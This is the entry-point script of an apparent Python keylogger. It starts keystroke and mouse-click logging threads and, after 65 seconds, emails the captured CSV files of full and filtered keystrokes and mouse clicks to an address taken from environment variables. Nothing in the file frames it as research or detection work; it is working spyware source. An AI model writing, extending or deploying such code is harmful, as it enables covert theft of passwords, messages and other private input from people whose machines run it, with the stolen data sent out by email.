import os
import threading
import Modules.Mailer as Mailer
import Modules.KeyStroke as KeyStroke
import Modules.MouseRecorder as MouseRecorder

if __name__ == '__main__':
    email = os.environ.get("EMAIL") # Enter your email address here
    password = os.environ.get("PASSWORD") # Enter your password here
    mailer = Mailer.Mailer(email, password)
    try:
        threading.Thread(target=KeyStroke.KeyLogger).start()
        threading.Thread(target=MouseRecorder.MouseLogger).start()
        threading.Timer(65, mailer.attachment_mail, args=[email, "Keystrokes", ["filtered_keystrokes.csv", "complete_keystrokes.csv", "mouse-click.csv"], "Keystrokes"]).start()
    except KeyboardInterrupt as e:
        pass